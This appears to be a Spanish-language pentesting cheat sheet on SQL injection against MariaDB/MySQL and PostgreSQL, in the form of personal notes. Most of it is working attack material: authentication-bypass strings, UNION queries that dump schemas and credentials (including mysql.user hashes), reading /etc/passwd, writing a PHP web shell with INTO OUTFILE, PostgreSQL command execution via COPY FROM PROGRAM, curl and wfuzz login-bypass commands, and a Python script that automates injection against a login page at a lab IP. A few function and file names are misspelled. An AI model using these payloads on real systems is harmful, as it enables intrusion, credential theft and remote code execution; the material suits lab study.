---
title: SQL Injection
published: true
---


* MariaDb sql:
<br>
<p>		* Use <font color="lime">anonsruf </font>para no ser detectado</p>
<p>	    * Mire los valores de símbolos en hexadecimal con <font color="lime">man ascii</font></p>
<p> 	* Mas información de sql en cuanto a código respecta <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet"> aquí </a></p>
<p> 	* Mas laboratorios de pentesting : <a href="https://portswigger.net/web-security/all-labs">aqui</a></p>
<br>

```python

mysql -u{useraname} -p{password} # Conectar a la base de datos.

create database {DATABASE NAME}; # Crea una base de datos.

drop database {DATABASE NAME}; # ELimina una base de datos.

create table users(id int auto_increment PRIMARY KEY, username varchar(32), password varchar(32), vip varchar(32)); # Creacion de tabla.

drop table {TABLE NAME}; # Elimina una tabla.

show databases; # Muestra la base de datos actuales.

use [database_name]; # Usa la base de datos seleccionada.

show tables; # Muestra las tablas de la base de datos.

describe [table_name]; # Muestra la descripcion de una tabla.

select * from [table_name]; # Muestra todo el contenido de una tabla.

insert into users(username, password, vip) values("admin", "adminpass$!-?", "No aplica"); # Insertar valores en una tabla creada.

where = done.
select = selección.
from = de.

	* SQL INJECTION

'or 1 = 1- --

'or 1 = 1#

select * from users where username='admin'or 1=1;-- -; # Listar todos los datos de una tabla.

select * from users where username='admin'order by 5; # Enumerar la cantidad de columnas en una tabla, en este caso el tope era 4 es decir que dara un fallo.

select * from users where username='admin'union select version(),database(),user(),NULL; # Muestra la version,nombre BD, usuario, NULL 'nada'.

select * from users where username='admin'union select load_file('/etc/pass'),NULL,NULL; # Carga el archivo /etc/passwd para poder verlo.

@@version # alternativas a version().

select username from users where username='admin' union select scheme_name from information_schema.schemata; # Observa toda las bases de datos.

select * from users union select 1,2,3,group_contac(schema_name) from information_schema.schemata; # Muestra las bases de datos dentro de la misma cadena es decir, en caso dado que la pagina no le represente todas las bases de datos, esta es una alternativa.

select * from users union select 1,2,3,schema_name from information_schema.schemata limit 1,1; # Otra alternativa de group_contact() para mostrar los datos uno por uno.

select id, username from users union select NULL,table_name from information_schema.tables; #Lista todas las tablas de todas las bases de datos.

select id, username from users union select NULL,table_name from information_schema.tables where table_schema='{BASE DE DATOS}' # Enumera las tablas de una base de datos dada.

select * from users union select NULL,NULL,NULL,column_name from information_schema.columns where table_schema='{BASE DE DATOS}' and table_name='{TABLE NAME}' # Enumera las columnas de una tabla dada.

select username from users union select group_concat(password) from users; # Mira el contenido de una columna.

select username from users union select group_concat(username,':',password, ' -> '); # Para verlos mas ordenado.

select username from users union select group_concat(username,0x3A,password); # Alternativa por si no deja incrustar string, se le incrusta hexadecimal.

select * from users union select NULL,NULL,NULL,group_concat(username,0x3a,password) from practiqueSql.users; # Muestra el contenido de una tabla dada de una base de datos dada.

select * from users union select NULL,NULL,"<?php system('whoami');?>",NULL into outfile "/var/www/html" # Escribir un texto en un archivo.

select * from users union select NULL,NULL,group_concat(User,0x3a,Password) from mysql.user-- - #Enumera las credenciales

```

<br>
<center># PostgreSql RCE 9.3</center>

1. Eliminación de tabla en el caso de que sea existente.

```sql
DROP TABLE IF EXIST cmd_exec;
```

2. Creación de la tabla para la inyección de comando arbitrarios.

```sql
 CREATE TABLE cmd_exec(cmd_output text);
```

3. Inyección de comandos

```sql
 COPY cmd_exec from PROGRAM 'whoami';
```
<br>
<center> # Sql En Panel Login</center>
<br>
```python
#Injeccion sql en panel administrador, desde petenciones con curl:
curl -s -X POST "http://10.10.254.165/login.php" -d "username='|| or 1=1-- - &password=-- -" -i

#Injeccion sql en base a un wordlist de injeccion sql:
wfuzz -t 20 -c -z file,wordlists.txt -d "username=FUZZ\&password=FUZZ" http://10.10.254.165/login.php
```
* Sabiendo estos datos puedo crear perfectamente un script en python que aplique injeccion sql en paneles administradores

```python
#!/usr/bin/python
import requests

id_username = 'username'
id_password = 'password'
url = 'http://10.10.254.165/login.php'
 
sql_payload = [

    "' or 1=1-- -",
    "' || or 1=1-- -",
    "' 1=1-- -"

]
for list in sql_payload:
    datos = requests.post(url, data={id_username : list, id_password : list}, allow_redirects=False)
    if datos.status_code != 200:
        print("[+] Injection sql sucess :", list)
        exit()
    print("Failed : ", datos.status_code, list)


```
